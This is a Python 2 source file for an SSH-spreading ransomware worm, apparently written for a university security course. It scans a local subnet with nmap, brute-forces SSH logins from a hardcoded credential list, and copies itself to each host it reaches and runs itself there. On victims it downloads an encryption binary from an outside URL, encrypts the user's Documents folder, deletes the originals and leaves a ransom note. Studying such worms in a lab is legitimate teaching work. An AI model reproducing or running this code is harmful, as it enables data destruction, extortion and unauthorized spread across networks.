import paramiko
import sys
import socket
import nmap
import netinfo
import os
import sys
import netifaces
import fcntl, struct
import commands
import urllib
import tarfile
import shutil
from subprocess import call

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
ATTACKER_IP = "192.168.1.6"
##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	print "spreadingAndExcuting on this IP..."

	# 1. worm will copy itself to the remote system
	#	mark as infected too
	sftpClient = sshClient.open_sftp()
	sftpClient.put("/tmp/extorter_worm.py","/tmp/" + "extorter_worm.py")

	# 2. change permissions to executable 
	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
	
	# 3. execute it's self
	sshClient.exec_command("python /tmp/extorter_worm.py")

	sys.exit()


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, userPassword, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

	try:
		# We are in
		sshClient.connect(host, username=userName, password=userPassword)
		print "successfully connected"
		return 0
	except paramiko.SSHException:
		print "wrong credentials"
	# SSH server is up, but the credentials are probably wrong
		return 1
	# Something wrong with the SSH server?
	except socket.error:
		print "server is down"
		return 3
	
	#sftpClient = sshClient.open_sftp()

	#sftpClient.put("test.py","/tmp/" + "test.py")
	
	#ssh.exec_command("chmod a+x /tmp/attackingFile.txt")


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 

		attemptResults = tryCredentials(host,username,password,ssh)

		#print "attempting to attack ip: ", host
		if  attemptResults == 0:	
			return (ssh,username,password)
		# The server is down
		elif attemptResults == 3:
			break		


			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP():
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.

	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr
	

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	

	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hosts
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			#if host IP is not attacker.. then list as a target
			if (not host == ATTACKER_IP):
				liveHosts.append(host)
	
	
		
	return liveHosts

	#pass

def createTarFile():
	#create a tar archive of /home/cpsc/Documents
	tar = tarfile.open("/tmp/documents.tar", "w:gz")
	# Add the /home/cpsc/Documents directory to the archive
	tar.add("/home/cpsc/Documents")
	# Close the archive file
	tar.close()

def encryptTar():
	#encrypt documents.tar file
	call(["chmod", "a+x", "/tmp/openssl"])
	call(["/tmp/openssl", "aes-256-cbc", "-a", "-salt", "-in", "/tmp/documents.tar", "-out", "/tmp/documents.tar.enc", "-k", "cs456worm"])
	call(["rm","/tmp/documents.tar"])
# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 

#============================
#attackers IP = ATTACKER_IP
#============================

if getMyIP() == ATTACKER_IP:
	print "Welcome attacker :)\nGettin ready to spread worm...\n"

if not getMyIP() == ATTACKER_IP:

	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	print "IP: ", getMyIP() ,"...is a victim!!!!"
	commands.getstatusoutput('touch /tmp/infected.txt')

	#download the encryption program on to /tmp/
	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")

	#create the tar file in /tmp/
	createTarFile()

	#encypt the and create new tar file then delete the original tar file
	encryptTar()

	#remove the documents directory
	shutil.rmtree("/home/cpsc/Documents",ignore_errors=True)

	#create new ransom letter in /home/cpsc/Desktop
	file = open("/home/cpsc/Desktop/ransome_letter.txt","wb")
	file.write("Dear peasant, \n\nYour documents and personal belongings are encrypted.\n")
	file.write("You will need to purchase the decryption key if you in order to get files back")
	file.close()

# TODO: Get the IP of the current system
myIP = getMyIP()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).

if not myIP == ATTACKER_IP: 
	networkHosts.remove(myIP)
	print "removed myIP from being attacked, attacklist: ", networkHosts


print "Found hosts: ", networkHosts , "\n"


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	#trying to crack password -> access system
	#@return true if password is cracked
	sshInfo =  attackSystem(host)
	
	#print "sshInfo: ", sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		ssh = sshInfo[0]
		sftp = ssh.open_sftp()
		try:
			remotepath = '/tmp/infected.txt'
			localpath = '/home/cpsc/infectionCheck.txt'
			 # Copy the file from the specified
			 # remote path to the specified
			 # local path. If the file doesn't exist
			 # at the remote path, then get()
			 # will throw IOError exception
			 # (that is, we know the system is
			 # not yet infected).
		
			sftp.get(remotepath, localpath)
			print "target is already infected...cancel attack"
			
		except IOError:
			print "This system should be infected"

		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
			spreadAndExecute(sshInfo[0])
		
			print "Spreading complete\n"	
	

